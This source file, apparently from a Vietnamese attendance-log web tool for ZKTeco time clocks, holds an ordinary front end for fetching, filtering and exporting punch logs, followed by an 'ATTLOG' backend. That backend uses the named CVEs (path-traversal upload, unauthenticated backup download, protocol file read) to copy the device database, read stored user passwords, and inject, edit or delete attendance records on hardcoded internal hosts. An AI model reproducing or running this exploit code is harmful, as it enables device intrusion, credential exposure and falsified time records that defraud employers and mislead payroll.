  setStatus('Da set filter: ' + kind + (kind !== 'all' ? ' (' + fmt(from) + (kind === 'today' || kind === 'yesterday' ? '' : ' - ' + fmt(to)) + ')' : ''), false);
}

async function fetchLogs() {
  if (isFetching) { setStatus('Dang fetch, vui long doi (hoac bam Dung).', false); return; }
  // Only fetch from attendance devices
  const sel = allDevices.filter(function(d) { return d.selected && d.type === 'attendance'; }).map(function(d) { return d.ip; });
  if (sel.length === 0) {
    setStatus('Chon it nhat 1 may cham cong (CC).', true);
    return;
  }
  isFetching = true;
  document.getElementById('btnFetch').disabled = true;
  document.getElementById('btnStop').disabled = false;
  document.getElementById('btnExport').disabled = true;
  document.getElementById('btnFetch').textContent = 'Dang lay...';
  setStatus('Bat dau lay log tu ' + sel.length + ' may cham cong...', false);
  try {
    const r = await fetch('/api/fetch', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ips: sel, dateFrom: document.getElementById('dateFrom').value, dateTo: document.getElementById('dateTo').value})
    });
    const resp = await r.json();
    if (!resp.ok) { setStatus('Loi: ' + (resp.error || r.status), true); }
  } catch (e) {
    setStatus('Loi ket noi: ' + e.message, true);
  }
}

async function stopFetch() {
  if (!isFetching) return;
  setStatus('Dang gui yeu cau dung...', false);
  try {
    await fetch('/api/cancel', {method: 'POST'});
    setStatus('Da gui yeu cau dung. Cho may hien tai xong roi dung...', false);
  } catch(e) { setStatus('Loi gui yeu cau dung: ' + e.message, true); }
}

async function pollStatus() {
  try {
    const r = await fetch('/api/status');
    if (!r.ok) return;
    const s = await r.json();
    setStatus(s.message, false);
    if (s.total > 0) {
      document.getElementById('progressBar').style.width = ((s.progress / s.total) * 100) + '%';
    }
    if (!s.running) {
      isFetching = false;
      document.getElementById('btnFetch').disabled = false;
      document.getElementById('btnStop').disabled = true;
      document.getElementById('btnExport').disabled = false;
      document.getElementById('btnFetch').textContent = 'Lay log';
      try {
        const r2 = await fetch('/api/records');
        allRecords = await r2.json();
      } catch(e) {}
      try { const r3 = await fetch('/api/devices'); allDevices = await r3.json(); } catch(e) {}
      populateDeviceFilter();
      renderDevices();
      applyFilter();
    }
  } catch(e) {}
}

setInterval(pollStatus, 1500);

function applyFilterLogs() {
  const chkDate = document.getElementById('chkDate').checked;
  const dateFrom = new Date(document.getElementById('dateFrom').value);
  const dateTo = new Date(document.getElementById('dateTo').value);
  dateTo.setHours(23, 59, 59, 999);
  const search = (document.getElementById('logSearchInput').value || '').toLowerCase().trim();
  const statusFilter = document.getElementById('filterStatus').value;
  const deviceFilter = document.getElementById('filterDevice').value;
  const punchFilter = document.getElementById('filterPunch').value;
  const timeFrom = document.getElementById('filterTimeFrom').value;
  const timeTo = document.getElementById('filterTimeTo').value;
  const filtered = allRecords.filter(function(r) {
    if (chkDate) {
      const t = new Date(r.timestamp);
      if (t < dateFrom || t > dateTo) return false;
    }
    if (search) {
      const s = search.toLowerCase();
      if ((r.user_id || '').toLowerCase().indexOf(s) < 0 &&
          (r.device_ip || '').toLowerCase().indexOf(s) < 0) return false;
    }
    // Status filter
    if (statusFilter !== '' && String(r.status) !== statusFilter) return false;
    // Device filter
    if (deviceFilter && r.device_ip !== deviceFilter) return false;
    // Punch filter
    if (punchFilter !== '') {
      const p = parseInt(punchFilter);
      if (p === 3) {
        if ((r.punch || 0) < 3) return false;
      } else {
        if (r.punch !== p) return false;
      }
    }
    // Time of day filter
    if (timeFrom || timeTo) {
      const t = new Date(r.timestamp);
      const hh = String(t.getHours()).padStart(2, '0');
      const mm = String(t.getMinutes()).padStart(2, '0');
      const timeStr = hh + ':' + mm;
      if (timeFrom && timeStr < timeFrom) return false;
      if (timeTo && timeStr > timeTo) return false;
    }
    return true;
  });
  renderLogs(filtered);
}

function clearLogFilters() {
  document.getElementById('filterStatus').value = '';
  document.getElementById('filterDevice').value = '';
  document.getElementById('filterPunch').value = '';
  document.getElementById('filterTimeFrom').value = '';
  document.getElementById('filterTimeTo').value = '';
  document.getElementById('logSearchInput').value = '';
  applyFilterLogs();
}

// Populate device dropdown when records change, with search filter
function populateDeviceFilter() {
  const sel = document.getElementById('filterDevice');
  const searchInput = document.getElementById('filterDeviceSearch');
  const cur = sel.value;
  const search = (searchInput ? searchInput.value : '').toLowerCase().trim();
  const ips = Array.from(new Set(allRecords.map(function(r) { return r.device_ip; }).filter(function(x) { return x; }))).sort();
  let filtered = ips;
  if (search) {
    filtered = ips.filter(function(ip) { return ip.toLowerCase().indexOf(search) >= 0; });
  }
  let html = '<option value="">-- Tat ca (' + ips.length + ') --</option>';
  filtered.forEach(function(ip) {
    html += '<option value="' + ip + '"' + (ip === cur ? ' selected' : '') + '>' + ip + '</option>';
  });
  sel.innerHTML = html;
}

function renderLogs(records) {
  const c = document.getElementById('logTable');
  if (records.length === 0) {
    c.innerHTML = '<div class="empty">' + (allRecords.length === 0 ? 'Chua co du lieu. Bam "Lay log" de bat dau.' : 'Khong co ban ghi nao khop filter.') + '</div>';
    document.getElementById('summary').textContent = ' | 0 / ' + allRecords.length.toLocaleString();
    return;
  }
  let html = '<table><thead><tr><th>Thiet bi</th><th>Ma NV</th><th>Ngay</th><th>Gio</th><th>Trang thai</th><th>Punch</th><th>UID</th></tr></thead><tbody>';
  records.forEach(function(r) {
    const stName = STATUS_MAP[r.status] || ('Status ' + r.status);
    html += '<tr><td>' + r.device_ip + '</td><td>' + r.user_id + '</td><td>' + r.date + '</td><td>' + r.time + '</td><td>' + stName + '</td><td>' + r.punch + '</td><td>' + r.uid + '</td></tr>';
  });
  html += '</tbody></table>';
  c.innerHTML = html;
  document.getElementById('summary').textContent = ' | ' + records.length.toLocaleString() + ' / ' + allRecords.length.toLocaleString() + ' logs';
}

function exportCsv() {
  if (allRecords.length === 0) { setStatus('Chua co du lieu de export.', true); return; }
  // Reuse current filter logic by calling applyFilterLogs and intercepting
  const chkDate = document.getElementById('chkDate').checked;
  const dateFrom = new Date(document.getElementById('dateFrom').value);
  const dateTo = new Date(document.getElementById('dateTo').value);
  dateTo.setHours(23, 59, 59, 999);
  const search = (document.getElementById('logSearchInput').value || '').toLowerCase().trim();
  const statusFilter = document.getElementById('filterStatus').value;
  const deviceFilter = document.getElementById('filterDevice').value;
  const punchFilter = document.getElementById('filterPunch').value;
  const timeFrom = document.getElementById('filterTimeFrom').value;
  const timeTo = document.getElementById('filterTimeTo').value;
  const filtered = allRecords.filter(function(r) {
    if (chkDate) {
      const t = new Date(r.timestamp);
      if (t < dateFrom || t > dateTo) return false;
    }
    if (search) {
      const s = search.toLowerCase();
      if ((r.user_id || '').toLowerCase().indexOf(s) < 0 && (r.device_ip || '').toLowerCase().indexOf(s) < 0) return false;
    }
    if (statusFilter !== '' && String(r.status) !== statusFilter) return false;
    if (deviceFilter && r.device_ip !== deviceFilter) return false;
    if (punchFilter !== '') {
      const p = parseInt(punchFilter);
      if (p === 3) { if ((r.punch || 0) < 3) return false; }
      else if (r.punch !== p) return false;
    }
    if (timeFrom || timeTo) {
      const t = new Date(r.timestamp);
      const hh = String(t.getHours()).padStart(2, '0');
      const mm = String(t.getMinutes()).padStart(2, '0');
      const timeStr = hh + ':' + mm;
      if (timeFrom && timeStr < timeFrom) return false;
      if (timeTo && timeStr > timeTo) return false;
    }
    return true;
  });
  const statusMap = {0:'Check-In', 1:'Check-Out', 2:'Break-Out', 3:'Break-In', 4:'OT-In', 5:'OT-Out'};
  let csv = 'DeviceIP,DeviceType,UserID,Date,Time,Status,Punch,UID,Timestamp\n';
  filtered.forEach(function(r) {
    csv += r.device_ip + ',' + (r.device_type || 'attendance') + ',' + r.user_id + ',' + r.date + ',' + r.time + ',' + (statusMap[r.status] || r.status) + ',' + r.punch + ',' + r.uid + ',' + r.timestamp + '\n';
  });
  const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'attendance_' + new Date().toISOString().slice(0,19).replace(/[T:]/g, '-').slice(0,16) + '.csv';
  a.click();
  setStatus('Da export ' + filtered.length + ' ban ghi ra file CSV.', false);
}

// === REPORTS ===
async function openReport() {
  document.getElementById('reportModal').style.display = 'block';
  document.getElementById('reportContent').innerHTML = '<p style="color:#888">Dang tai bao cao...</p>';
  try {
    const r = await fetch('/api/report/daily');
    const data = await r.json();
    let html = '<h3 style="color:#00d4ff;margin-top:0">Bao cao theo ngay</h3>';
    html += '<p style="color:#888">Tong: ' + data.total_nvs + ' luot NV x ' + data.days.length + ' ngay</p>';
    for (const day of data.days.slice(0, 30)) {
      html += '<h4 style="color:#5fff7f;margin:10px 0 5px">' + day.date + ' (' + day.nvs.length + ' NV)</h4>';
      html += '<table style="width:100%;font-size:12px;border-collapse:collapse">';
      html += '<tr style="background:#1a2a3a"><th style="padding:4px;text-align:left">Ma NV</th><th>Check-In</th><th>Check-Out</th><th>Gio</th><th>Ca</th><th>TT</th><th>Thiet bi</th></tr>';
      for (const nv of day.nvs) {
        const statusColor = nv.status === 'Complete' ? '#5fff7f' : '#ffd700';
        html += '<tr style="border-top:1px solid #2a3a5a"><td style="padding:4px">' + nv.user_id + '</td>';
        html += '<td>' + nv.first_in + '</td><td>' + nv.last_out + '</td>';
        html += '<td>' + nv.hours_worked + 'h</td><td>' + nv.complete_shifts + '</td>';
        html += '<td style="color:' + statusColor + '">' + nv.status + '</td>';
        html += '<td style="font-size:10px;color:#888">' + nv.devices.join(',') + '</td></tr>';
      }
      html += '</table>';
    }
    if (data.days.length > 30) html += '<p style="color:#888">... va ' + (data.days.length - 30) + ' ngay khac</p>';
    document.getElementById('reportContent').innerHTML = html;
  } catch (e) {
    document.getElementById('reportContent').innerHTML = '<p style="color:#f88">Loi: ' + e.message + '</p>';
  }
}

function closeReport() {
  document.getElementById('reportModal').style.display = 'none';
}

async function openToday() {
  document.getElementById('reportModal').style.display = 'block';
  document.getElementById('reportContent').innerHTML = '<p style="color:#888">Dang tai...</p>';
  try {
    const r = await fetch('/api/report/today');
    const data = await r.json();
    let html = '<h3 style="color:#00d4ff;margin-top:0">Hom nay: ' + data.date + '</h3>';
    html += '<div style="display:flex;gap:20px;margin:10px 0">';
    html += '<div style="background:#1a4a1a;padding:10px 20px;border-radius:4px"><b style="color:#5fff7f;font-size:24px">' + data.in_count + '</b><br><span style="color:#888">Dang lam</span></div>';
    html += '<div style="background:#4a1a1a;padding:10px 20px;border-radius:4px"><b style="color:#ff8888;font-size:24px">' + data.out_count + '</b><br><span style="color:#888">Da ve</span></div>';
    html += '<div style="background:#1a3a5a;padding:10px 20px;border-radius:4px"><b style="color:#5fcfff;font-size:24px">' + data.unique_nvs + '</b><br><span style="color:#888">Tong NV</span></div>';
    html += '<div style="background:#2a2a2a;padding:10px 20px;border-radius:4px"><b style="color:#ffd700;font-size:24px">' + data.total_punches + '</b><br><span style="color:#888">Luot cham</span></div>';
    html += '</div>';
    html += '<table style="width:100%;font-size:13px;border-collapse:collapse">';
    html += '<tr style="background:#1a2a3a"><th style="padding:6px;text-align:left">Ma NV</th><th>Trang thai</th><th>Vao</th><th>Cuoi</th><th>Gio</th><th>Thiet bi</th></tr>';
    for (const nv of data.nvs) {
      const sc = nv.current_status === 'In' ? '#5fff7f' : '#ff8888';
      html += '<tr style="border-top:1px solid #2a3a5a"><td style="padding:6px"><b>' + nv.user_id + '</b></td>';
      html += '<td style="color:' + sc + '">' + nv.current_status + '</td>';
      html += '<td>' + nv.first_in + '</td><td>' + nv.last_event + '</td>';
      html += '<td>' + nv.hours_worked + 'h</td>';
      html += '<td style="font-size:10px;color:#888">' + nv.devices.join(',') + '</td></tr>';
    }
    html += '</table>';
    document.getElementById('reportContent').innerHTML = html;
  } catch (e) {
    document.getElementById('reportContent').innerHTML = '<p style="color:#f88">Loi: ' + e.message + '</p>';
  }
}

function exportExcel() {
  // Direct download via /api/report/export
  window.location.href = '/api/report/export';
  setStatus('Dang xuat file Excel (.xls)...', false);
}

// Hook log filter into renderDevices
renderDevices = function() { renderDeviceList(); applyFilterLogs(); };

loadDevices();
pollStatus();
</script>

<!-- Report Modal -->
<div id="reportModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;overflow-y:auto">
  <div style="background:#0f1729;border:1px solid #2a3a5a;max-width:1200px;margin:30px auto;padding:20px;border-radius:6px;color:#fff">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px">
      <h2 style="color:#00d4ff;margin:0">Bao cao cham cong</h2>
      <button onclick="closeReport()" style="background:#5a1a1a;color:#fff;border:1px solid #6a2a2a;padding:6px 14px;border-radius:4px;cursor:pointer">Dong [X]</button>
    </div>
    <div id="reportContent"><p style="color:#888">Dang tai...</p></div>
  </div>
</div>
</body>
</html>'''


# ============================================================
# ATTLOG TOOL HELPERS (CVE-2023-3941 + CVE-2023-4587)
# ============================================================
ATTLOG_WORK_DIR = os.path.join(SCRIPT_DIR, 'attlog_workspace')
os.makedirs(ATTLOG_WORK_DIR, exist_ok=True)

# Background jobs registry (avoids HTTP timeout on long ops)
import uuid
ATTLOG_JOBS = {}
ATTLOG_JOB_LOCK = threading.Lock()


def _start_attlog_job(job_type, data):
    """Start a background job and return job_id immediately."""
    ip = data.get('ip', '').strip()
    if not ip:
        return None, 'Thieu ip'
    job_id = str(uuid.uuid4())[:8]
    with ATTLOG_JOB_LOCK:
        ATTLOG_JOBS[job_id] = {
            'job_id': job_id, 'type': job_type, 'ip': ip,
            'status': 'queued', 'progress': 0, 'message': 'Queued',
            'started_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'finished_at': None, 'result': None
        }
    t = threading.Thread(target=_run_attlog_job, args=(job_id, job_type, data), daemon=True)
    t.start()
    return job_id, None


def _run_attlog_job(job_id, job_type, data):
    """Run a background ATTLOG job and update its status."""
    try:
        with ATTLOG_JOB_LOCK:
            ATTLOG_JOBS[job_id]['status'] = 'running'
            ATTLOG_JOBS[job_id]['message'] = 'Starting ' + job_type + '...'
        result = None
        if job_type == 'inject':
            pin = str(data.get('pin', '')).strip()
            timestamp = data.get('timestamp', '').strip()
            status = int(data.get('status', 0))
            punch = int(data.get('punch', 1))
            verify_mode = int(data.get('verify_mode', 1))
            marker = data.get('marker', '').strip()
            web_ip = data.get('web_ip', '').strip() or None
            count = int(data.get('count', 1))
            result = attlog_inject(data['ip'], pin, timestamp, status=status, punch=punch,
                                    verify_mode=verify_mode, marker=marker, web_ip=web_ip,
                                    count=count,
                                    progress_cb=lambda msg: _update_job_progress(job_id, msg))
        elif job_type == 'delete':
            marker = data.get('marker', '').strip()
            web_ip = data.get('web_ip', '').strip() or None
            result = attlog_delete_marker(data['ip'], marker, web_ip=web_ip,
                                          progress_cb=lambda msg: _update_job_progress(job_id, msg))
        elif job_type == 'edit':
            marker = data.get('marker', '').strip()
            new_time = data.get('new_time', '').strip()
            web_ip = data.get('web_ip', '').strip() or None
            result = attlog_edit_time(data['ip'], marker, new_time, web_ip=web_ip,
                                       progress_cb=lambda msg: _update_job_progress(job_id, msg))
        with ATTLOG_JOB_LOCK:
            ATTLOG_JOBS[job_id]['status'] = 'done' if result.get('ok') else 'error'
            ATTLOG_JOBS[job_id]['message'] = 'Done' if result.get('ok') else result.get('error', 'Loi')
            ATTLOG_JOBS[job_id]['finished_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ATTLOG_JOBS[job_id]['result'] = result
    except Exception as e:
        with ATTLOG_JOB_LOCK:
            ATTLOG_JOBS[job_id]['status'] = 'error'
            ATTLOG_JOBS[job_id]['message'] = str(e)[:200]
            ATTLOG_JOBS[job_id]['finished_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def _update_job_progress(job_id, msg):
    with ATTLOG_JOB_LOCK:
        if job_id in ATTLOG_JOBS:
            ATTLOG_JOBS[job_id]['message'] = msg


def _attlog_send_cmd(conn, command, data=b''):
    """pyzk send_command wrapper. Returns dict {status, code, error?}."""
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}


def _attlog_upload_zkdb(conn, data, chunk_size=32768):
    """Upload ZKDB.db via UPLOAD_PICTURE 0x272B + path traversal (CVE-2023-3941)."""
    traversal = ('..' + chr(47)) * 7 + 'mnt/mtdblock/data/ZKDB.db'
    fn = traversal.encode() + b'\x00'
    sz = len(data)
    r1 = _attlog_send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', sz))
    if not r1.get('status'):
        return {'error': 'PREPARE_DATA fail', 'r1': r1}
    packets = sz // chunk_size
    remain = sz % chunk_size
    failed = []
    t0 = time.time()
    for i in range(packets):
        r = _attlog_send_cmd(conn, const.CMD_DATA, data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            failed.append(i)
            if len(failed) > 5:
                return {'error': 'too many fails', 'failed': failed}
    if remain:
        _attlog_send_cmd(conn, const.CMD_DATA, data[packets*chunk_size:])
    r3 = _attlog_send_cmd(conn, 0x272B, fn)
    return {'PREPARE': r1, 'UPLOAD': r3, 'failed_chunks': failed,
            'time_s': round(time.time() - t0, 1)}


def _attlog_download_zkdb(web_ip, out_path, timeout_s=8):
    """Download ZKDB.db from web backup (CVE-2023-4587). 8s timeout - fail fast if no VPN."""
    import urllib.request, gzip, socket
    url = 'http://{}/form/DataApp?style=0'.format(web_ip)
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req, timeout=timeout_s) as resp:
            data = resp.read()
    except socket.timeout:
        raise RuntimeError('timeout {}s (no route to {})'.format(timeout_s, web_ip))
    except Exception as e:
        raise RuntimeError('connect fail: {}'.format(str(e)[:80]))
    if len(data) < 1000:
        raise RuntimeError('response too small ({} bytes)'.format(len(data)))
    gz_off = data.find(b'\x1f\x8b\x08')
    if gz_off < 0:
        raise RuntimeError('not a ZK web backup (no GZIP header)')
    gz = gzip.decompress(data[gz_off:])
    sq_off = gz.find(b'SQLite format 3')
    if sq_off < 0:
        raise RuntimeError('no SQLite DB inside payload')
    tar_hdr = gz[:512]
    size_oct = tar_hdr[124:136].decode('ascii', errors='replace').strip('\x00')
    fsize = int(size_oct, 8)
    sq = gz[sq_off:sq_off + fsize]
    with open(out_path, 'wb') as f:
        f.write(sq)
    return sq


def get_device_info(ip):
    """Get info from a ZK device via port 4370 protocol."""
    import sqlite3
    info = {'connected': False, 'firmware': '', 'platform': '', 'serial': '',
            'log_count': 0, 'users': 0, 'has_web': False, 'ip': ip}
    try:
        zk = ZK(ip, port=4370, timeout=8, ommit_ping=True, verbose=False)
        conn = zk.connect()
        if not conn:
            info['error'] = 'connect failed'
            return info
        info['firmware'] = conn.get_firmware_version() or ''
        info['platform'] = conn.get_platform() or ''
        info['serial'] = conn.get_serialnumber() or ''
        zk.read_sizes()
        info['log_count'] = zk.records or 0
        info['users'] = zk.users or 0
        info['connected'] = True
        try: conn.disconnect()
        except: pass
    except Exception as e:
        info['error'] = str(e)[:200]
    # Test if web on port 80
    try:
        import urllib.request
        urllib.request.urlopen('http://{}/'.format(ip), timeout=2)
        info['has_web'] = True
    except:
        info['has_web'] = False
    return info


def check_user(ip, pin, password=None):
    """Find a user on ZK device by PIN (uid or user_id). Optionally compare password.

    ZK protocol: User passwords are stored as numeric strings on the device
    (NOT hashed in many firmware versions - X628 PRO 6.60 stores raw).
    Returns dict {ok, matched, user, password_match, password_stored, error}.

    Use case: BS muốn test "PIN 1, pass 891401" trên máy ZK qua port 4370.
    """
    import re
    result = {'ok': False, 'ip': ip, 'pin': str(pin),
              'matched': False, 'user': None,
              'password_match': None, 'password_stored': None,
              'error': ''}
    try:
        zk = ZK(ip, port=4370, timeout=8, ommit_ping=True, verbose=False)
        if not zk.connect():
            result['error'] = 'connect failed'
            return result
        try:
            users = zk.get_users()
            for u in users:
                uid_int = 0
                try:
                    uid_int = int(getattr(u, 'uid', 0) or 0)
                except Exception:
                    uid_int = 0
                user_id_str = str(getattr(u, 'user_id', '') or '')
                name = str(getattr(u, 'name', '') or '')
                # Match by uid or user_id
                if str(uid_int) == str(pin) or user_id_str == str(pin):
                    user_dict = {
                        'uid': uid_int,
                        'user_id': user_id_str,
                        'name': name,
                        'privilege': int(getattr(u, 'privilege', 0) or 0),
                        'card': getattr(u, 'card', 0) or 0,
                        'group_id': str(getattr(u, 'group_id', '') or ''),
                    }
                    pwd_raw = getattr(u, 'password', '') or ''
                    user_dict['password'] = str(pwd_raw)
                    result['matched'] = True
                    result['user'] = user_dict
                    result['ok'] = True
                    if password is not None and str(password) != '':
                        result['password_match'] = (str(pwd_raw) == str(password))
                        result['password_stored'] = (str(pwd_raw) != '')
                    break
            if not result['matched']:
                result['error'] = 'PIN {} khong co trong may (co {} users)'.format(pin, len(users))
        finally:
            try:
                zk.disconnect()
            except Exception:
                pass
    except Exception as e:
        result['error'] = str(e)[:200]
    return result



WEB_IP_DEFAULT = '172.16.254.202'   # May 14 2018 fw - Web UI có ZKDB.db qua CVE-2023-4587
WEB_IP_FALLBACKS = ['172.16.254.202', '172.16.200.105']  # 254.202 verified; 200.105 is ADMS proxy


def _attlog_web_candidates(web_ip, device_ip=None):
    """Build list of web IPs to try in order.

    IMPORTANT: device_ip is a ZK terminal (port 4370 protocol) - it does NOT
    run an HTTP server, so it is NEVER a valid web candidate. Only IPs that
    expose /form/DataApp?style=0 are valid. In a Sophos VPN environment, the
    only reachable web IP is 172.16.254.202 (May 14 2018 fw).
    """
    out = []
    if web_ip and web_ip.strip():
        out.append(web_ip.strip())
    for fb in WEB_IP_FALLBACKS:
        if fb not in out:
            out.append(fb)
    return out


def _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60, progress_cb=None):
    """Download ZKDB.db from ZK device via protocol - CVE-2023-3940.

    Use this as FALLBACK when web backup (CVE-2023-4587) is not reachable.
    Path: /mnt/mtdblock/data/ZKDB.db (confirmed on X628 PRO FW 6.60).
    Returns the SQLite data bytes; raises RuntimeError on failure.

    v2.0.13 - PROPER PROTOCOL FLOW:
    The naive approach (parse raw socket as stream after READFILE 0x6A6) was WRONG
    and only captured ~7.1MB of the 7.6MB file (missing ~474 pages at end).

    CORRECT FLOW (per pyzk's __read_chunk + ZK protocol spec):
      1. CMD_READFILE 0x6A6 - load file into device buffer (returns PREPARE_DATA 1500)
      2. Loop CMD_READ_CHUNK 0x5E0 (1504) with (start_offset, chunk_size) until file
         fully read. Each call returns ~65472 bytes of payload.

    ROBUST BUSY-DEVICE HANDLING:
    - disable_device() locks screen so NV cannot trigger new ATTLOG writes
    - refresh_data() + get_attendance() drain in-memory queue
    - 8s wait for firmware's internal SQLite writer to commit in-flight transactions
    - If integrity_check fails, retry up to 5 times
    """
    from zk import ZK, const
    import sqlite3 as _sqlite3
    import time as _time
    last_err = None
    MAX_CHUNK = 0xFFC0  # 65472 bytes - pyzk's MAX_CHUNK for TCP
    TARGET_SIZE = 7_700_000  # ~7.7MB target (real file is 7,599,104 bytes)
    for outer in range(5):
        ref_count = None
        try:
            zk = ZK(device_ip, port=4370, timeout=20, password=0)
            conn = zk.connect()
        except Exception as e:
            raise RuntimeError('connect failed: {}'.format(str(e)[:80]))
        if not conn:
            raise RuntimeError('connect returned None')
        try:
            if progress_cb:
                progress_cb('🔒 [{}/5] Lock + drain + wait...'.format(outer + 1))
            try:
                conn.disable_device()
            except Exception:
                pass
            # Tell firmware to refresh data (might flush queue)
            for cmd in (getattr(const, 'CMD_REFRESHDATA', 1013),
                        getattr(const, 'CMD_REFRESHOPTION', 1014)):
                try:
                    conn._ZK__send_command(cmd, b'', response_size=8)
                except Exception:
                    pass
            # Drain in-memory ATTLOG queue
            try:
                att = conn.get_attendance()
                ref_count = len(att) if att else 0
                if progress_cb and outer == 0:
                    progress_cb('  ✓ ref_count = {}'.format(ref_count))
            except Exception:
                pass
            # Wait for firmware's SQLite writer to commit in-flight transactions
            if progress_cb and outer == 0:
                progress_cb('  ⏳ Wait 8s cho firmware flush SQLite...')
            _time.sleep(8)
            # Clear buffer
            try:
                conn._ZK__send_command(const.CMD_FREE_DATA, b'')
            except Exception:
                pass
            _time.sleep(0.3)
            # STEP 1: Load file into device buffer via READFILE 0x6A6
            path = b'/mnt/mtdblock/data/ZKDB.db\x00'
            try:
                r = conn._ZK__send_command(0x6A6, path, response_size=1024)
                if not r.get('status'):
                    last_err = 'READFILE rejected: {}'.format(r)
                    continue
            except Exception as e:
                last_err = 'READFILE send failed: {}'.format(str(e)[:80])
                continue
            # STEP 2: Loop __read_chunk to read full file (CRITICAL FIX v2.0.13)
            all_data = b''
            i = 0
            t_start = _time.time()
            try:
                while len(all_data) < TARGET_SIZE:
                    if _time.time() - t_start > timeout_s:
                        last_err = 'chunk read timeout after {} bytes'.format(len(all_data))
                        break
                    start = i * MAX_CHUNK
                    chunk = conn._ZK__read_chunk(start, MAX_CHUNK)
                    if not chunk:
                        # No more data
                        break
                    all_data += chunk
                    if progress_cb and i % 20 == 0:
                        progress_cb('    📥 {}/{} chunks ({:.2f}MB)'.format(
                            i, 120, len(all_data)/1024/1024))
                    i += 1
                    if i > 200:  # safety cap
                        break
            except Exception as e:
                err_str = str(e)[:80]
                if 'can\'t read chunk' in err_str:
                    # Normal end-of-file
                    pass
                else:
                    last_err = 'read_chunk err: {}'.format(err_str)
                    continue
            if progress_cb:
                progress_cb('  📦 Read {} chunks = {:.2f}MB'.format(
                    i, len(all_data)/1024/1024))
            if not all_data or all_data[:15] != b'SQLite format 3':
                last_err = 'not SQLite magic ({} bytes)'.format(len(all_data))
                continue
            # Save and verify integrity
            with open(out_path, 'wb') as f:
                f.write(all_data)
            try:
                db = _sqlite3.connect(out_path)
                cur = db.cursor()
                ick = cur.execute('PRAGMA integrity_check').fetchone()
                if not ick or ick[0] != 'ok':
                    db.close()
                    last_err = 'SQLite integrity_check fail: {}'.format(ick)
                    if progress_cb:
                        progress_cb('  ✗ integrity_check fail: {}'.format(ick))
                    continue
                cnt = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
                db.close()
                # Sanity: cnt should be >= ref_count
                if ref_count is not None and cnt < ref_count:
                    last_err = 'SQLite cnt={} < ref_count={}'.format(cnt, ref_count)
                    if progress_cb:
                        progress_cb('  ✗ count mismatch: SQLite={} < ref={}'.format(cnt, ref_count))
                    continue
                if progress_cb:
                    progress_cb('  ✅ OK! SQLite ATTLOG={} (ref={})'.format(cnt, ref_count))
                return all_data  # SUCCESS!
            except _sqlite3.DatabaseError as e:
                last_err = 'SQLite corrupted: {}'.format(str(e)[:100])
                if progress_cb:
                    progress_cb('  ✗ SQLite corrupted: {}'.format(str(e)[:60]))
                continue
        finally:
            try:
                conn.enable_device()
            except Exception:
                pass
            try:
                conn.disconnect()
            except Exception:
                pass
            if outer < 4:
                _time.sleep(2)
    raise RuntimeError('Protocol download fail after 5 attempts: {}'.format(last_err or 'unknown'))


def _attlog_download_zkdb_with_fallback(web_candidates, out_path, timeout_s=8, progress_cb=None, device_ip=None):
    """Try downloading ZKDB.db from each web candidate, then fall back to protocol READFILE.

    Order:
      1. HTTP /form/DataApp?style=0 on each web_candidate (CVE-2023-4587)
      2. ZK protocol READFILE 0x6A6 on device_ip port 4370 (CVE-2023-3940)

    progress_cb(str) is called with each attempt + result.
    Returns (data, used_source) where used_source = web_ip OR 'protocol:<device_ip>'.
    Raises RuntimeError('all sources failed: ...') at the end.
    """
    attempts = []
    # Phase 1: HTTP web backup candidates
    for w in web_candidates:
        if progress_cb:
            progress_cb('🌐 HTTP: dang thu {} ...'.format(w))
        try:
            data = _attlog_download_zkdb(w, out_path, timeout_s=timeout_s)
            if progress_cb:
                progress_cb('✅ HTTP {} OK ({:,} bytes)'.format(w, len(data)))
            return data, w
        except Exception as e:
            err_short = str(e)[:60]
            attempts.append('http://{}→{}'.format(w, err_short))
            print('[attlog_download_fallback] http {} failed: {}'.format(w, e), flush=True)
            if progress_cb:
                progress_cb('✗ HTTP {}: {}'.format(w, err_short))
            continue
    # Phase 2: Protocol READFILE fallback (works when web backup is unreachable)
    if device_ip:
        if progress_cb:
            progress_cb('🔌 Protocol: dang thu {} port 4370 (CVE-2023-3940)...'.format(device_ip))
            progress_cb('⚠ May 3 sẽ bị LOCK ~30-60s để refresh ATTLOG queue, NV không chấm công được trong lúc này')
        try:
            data = _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60, progress_cb=progress_cb)
            if progress_cb:
                progress_cb('✅ Protocol {} OK ({:,} bytes)'.format(device_ip, len(data)))
            return data, 'protocol:' + device_ip
        except Exception as e:
            err_short = str(e)[:80]
            attempts.append('zk://{}→{}'.format(device_ip, err_short))
            print('[attlog_download_fallback] protocol {} failed: {}'.format(device_ip, e), flush=True)
            if progress_cb:
                progress_cb('✗ Protocol {}: {}'.format(device_ip, err_short))
    summary = '; '.join(attempts)
    raise RuntimeError('Tất cả web candidates đều fail ({})'.format(summary))


def attlog_inject(ip, pin, timestamp, status=0, punch=1, verify_mode=1,
                  marker='', web_ip=None, count=1, progress_cb=None):
    """Inject ATTLOG records via CVE-2023-3941."""
    import sqlite3
    log = []
    log.append('ip={}, pin={}, ts={}, marker={}'.format(ip, pin, timestamp, marker or '(none)'))
    if progress_cb: progress_cb('⏳ Tải ZKDB.db (web + protocol fallback)...')

    # 1. Download ZKDB.db (auto-fallback: web → protocol READFILE)
    db_path = os.path.join(ATTLOG_WORK_DIR, 'inject_{}.db'.format(int(time.time())))
    try:
        web_candidates = _attlog_web_candidates(web_ip, ip)
        log.append('Thử lần lượt {} web candidates → nếu fail sẽ thử protocol port 4370...'.format(len(web_candidates)))
        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
